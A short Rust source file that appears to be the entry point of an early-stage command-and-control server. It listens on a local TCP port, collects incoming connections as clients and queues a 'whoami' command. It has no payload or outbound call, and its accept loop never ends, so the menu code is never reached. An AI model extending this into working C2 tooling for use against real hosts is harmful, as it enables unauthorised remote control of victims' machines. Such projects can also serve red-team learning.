use std::{net::{TcpListener, TcpStream}, thread};

mod server;
mod interface;
mod commands;

use interface::{Interface, Menu, Item};

use crate::server::*;

fn main() -> std::io::Result<()> {
    let mut interface = Interface::new();
    let mut menu = Menu::new("Command and Control Center".to_string());
    menu.add_item(Item::new("whoami command".to_string(), commands::whoami));
    
    let listener = TcpListener::bind("127.0.0.1:7878")?;

    let command = vec![String::from("whoami")];
    let mut c2 = C2::new(command);
    
    // accept incoming streams/clients and add to C2
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                c2.clients.push(Client::new(stream));
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }        
    }

    interface.display_menu(&menu)?;

    Ok(())
}

